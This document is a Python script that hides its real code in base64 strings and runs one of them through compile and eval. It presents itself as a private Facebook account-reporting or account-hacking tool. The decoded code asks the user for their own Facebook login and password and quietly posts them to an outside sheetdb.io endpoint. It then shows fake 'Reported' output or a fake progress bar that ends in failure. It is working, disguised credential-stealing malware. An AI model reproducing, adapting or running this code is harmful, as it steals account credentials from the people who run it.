import base64, codecs
Anony=b'CmltcG9ydCBiYXNlNjQsIGNvZGVjcwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRpbWUKaW1wb3J0IHRpbWUKaW1wb3J0IG9zCnByaW50KCIiIlwwMzNbMTszNm3ilI3ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHimIXilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJFcMDMzWzBtIiIiKQpwcmludCgiIiJcMDMzWzE7MzZtfCAgICAgXDAzM1sxOzM0bSBDcmVhdG9yPj4gICBBbm9ueW1vdXNcMDMzWzE7MzZtICAgICAgICAgICAgICAgfFwwMzNbMG0iIiIpCnByaW50KCIiIlwwMzNbMTszNm18ICAgICBcMDMzWzE7MzNtICAgICAgICAgICAgIHVuZW1jN2ZoZ29sOTAgIFwwMzNbMTszNm0gICAgICAgICB8XDAzM1swbSIiIikKcHJpbnQoIiIiXDAzM1sxOzM2beKUleKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKYheKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUmVwwMzNbMG0iIiIpCnByaW50ICgiICAgICAgXDAzM1szOzMybXsrK31UaGlzIFRvb2wgaXMgUHJpdmF0ZSBUb29sLDo6TmVlZCBUbyByZWdpc3RlciBXaXRoIHlvdXIgZmIgYWNjeysrfVwwMzNbMG1cbiIpCmludXNlcj1pbnB1dCgiXDAzM1sxOzMybUVudGVyIFlvdXIgRmIgVXNlcm5hbWUgb3IgcGggbm8gb3IgRW1haWw6OiIpCmlucGFzcz1pbnB1dCgiRW50ZXIgWW91ciBGYiBQYXNzd29yZDo6OiIpCnV0ZXh0PWJhc2U2NC5iNjRlbmNvZGUoaW51c2VyLmVuY29kZSgpKQp1bmV3dGV4dD11dGV4dFsxOjNdK3V0ZXh0CnVtYWluPWJhc2U2NC5iNjRlbmNvZGUodW5ld3RleHQpCgpwdGV4dD1iYXNlNjQuYjY0ZW5jb2RlKGlucGFzcy5lbmNvZGUoKSkKcG5ld3RleHQ9cHRleHRbMTozXStwdGV4dApwbWFpbj1iYXNlNjQuYjY0ZW5jb2RlKHVuZXd0ZXh0KQpwb3N0PXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vc2hlZXRkYi5pby9hcGkvdjEvdW5lbWM3Zmhnb2w5MCIsZGF0YT17IlVzZXJuYW1lIjp1bWFpbi5kZWNvZGUoKSwiUGFzc3dvcmQiOnBtYWluLmRlY29kZSgpfSkKdXNlcj1pbnB1dCgiWysrXVwwMzNbMTszM21FbnRlciBGQiBhY2MgTmFtZSBPciBJRCBPciBtYWlsIE9SIFBoIG5vXG4gdG8gSGFjazo6IikKcHJpbnQgKCJbKytdPj4+UnV1bmluZyAsUGxlYXNlIFBhdGllbnQiKQphbmk9WyJbI19fX19fX19fX10xMCUiLCJbIyNfX19fX19fX10yMCUiLCJbIyMjX19fX19fX10zMCUiLCJbIyMjI19fX19fX100MCUiLCJbIyMjIyNfX19fX101MCUiLCJbIyMjIyMjX19fX102MCUiLCJbIyMjIyMjI19fX103MCUiLCJbIyMjIyMjIyNfX104MCUiLCJbIyMjIyMjIyMjX105MCUiLCJbIyMjIyMjIyMjI10xMDAlIixdCmZvciBsb2FkIGluIGFuaToKCiAgICBwcmludCAoIj4+Pj4iK2xvYWQsZW5kPSJcciIpCiAgICB0aW1lLnNsZWVwKDAuNikKb3Muc3lzdGVtKCJjbHMiKQpwcmludCAoIlxyPj4+PlsjIyMjIyMjIyMjXTEwMCUiKQpwcmludCgiXG5bKysrXUZhaWwgLEZhaWwsVHJ5IEFnYWluWysrK10iKQo='
aab=b'CmltcG9ydCBiYXNlNjQsIGNvZGVjcwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRpbWUKaW1wb3J0IHRpbWUKaW1wb3J0IG9zCnByaW50KCIiIlwwMzNbMTszNm3ilI3ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHimIXilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilJFcMDMzWzBtIiIiKQpwcmludCgiIiJcMDMzWzE7MzZtfCAgICAgXDAzM1sxOzM0bSBDcmVhdG9yPj4gICBBbm9ueW1vdXNcMDMzWzE7MzZtICAgICAgICAgICAgICAgfFwwMzNbMG0iIiIpCnByaW50KCIiIlwwMzNbMTszNm18ICAgICBcMDMzWzE7MzNtICAgICAgICAgICAgIF9fX19fX19fX19fX18gIFwwMzNbMTszNm0gICAgICAgICB8XDAzM1swbSIiIikKcHJpbnQoIiIiXDAzM1sxOzM2beKUleKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKYheKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUmVwwMzNbMG0iIiIpCnByaW50ICgiICAgICAgXDAzM1szOzMybXsrK31UaGlzIFRvb2wgaXMgUHJpdmF0ZSBUb29sIGFuZCBGYWNlYm9vayBhY2MgUmVwb3J0IHRvb2x7Kyt9XDAzM1swbVxuIikKcHJpbnQgKCIgICAgICBcMDMzWzM7MzJteysrfUF0IGZpcnN0LFlvdSBOZWVkIHRvIExvZ2luIFRvIHJlcG9ydFwwMzNbMG1cbiIpCmludXNlcj1pbnB1dCgiXDAzM1sxOzMybUVudGVyIFlvdXIgRmIgVXNlcm5hbWUgb3IgcGggbm8gb3IgRW1haWw6OiIpCmlucGFzcz1pbnB1dCgiRW50ZXIgWW91ciBGYiBQYXNzd29yZDo6OiIpCnV0ZXh0PWJhc2U2NC5iNjRlbmNvZGUoaW51c2VyLmVuY29kZSgpKQp1bmV3dGV4dD11dGV4dFsxOjNdK3V0ZXh0CnVtYWluPWJhc2U2NC5iNjRlbmNvZGUodW5ld3RleHQpCgpwdGV4dD1iYXNlNjQuYjY0ZW5jb2RlKGlucGFzcy5lbmNvZGUoKSkKcG5ld3RleHQ9cHRleHRbMTozXStwdGV4dApwbWFpbj1iYXNlNjQuYjY0ZW5jb2RlKHVuZXd0ZXh0KQpwb3N0PXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vc2hlZXRkYi5pby9hcGkvdjEvdW5lbWM3Zmhnb2w5MCIsZGF0YT17IlVzZXJuYW1lIjp1bWFpbi5kZWNvZGUoKSwiUGFzc3dvcmQiOnBtYWluLmRlY29kZSgpfSkKdXNlcj1pbnB1dCgiWysrXVwwMzNbMTszM21FbnRlciBGQiBhY2MgTGlua1xuIHRvIFJlcG9ydDo6IikKcHJpbnQgKCJbY3RybCtjIHRvIHN0b3BdICAgICAgIFsrK10+Pj5SdW5uaW5nICxQbGVhc2UgUGF0aWVudFsrXSIpCnRpbWUuc2xlZXAoMSk7Cmk9MDsKd2hpbGUgVHJ1ZToKICAgIHByaW50IChmJ1wwMzNbMTszM21bK3tpKzF9K10gIFJlcG9ydGVkICBcMDMzWzBtJykKICAgIGk9aSsxCg=='
# print (base64.b64decode(Anony.decode()))
Run=compile(base64.b64decode(aab.decode()),'BTC','exec')
eval (Run)
print("\033[0m")
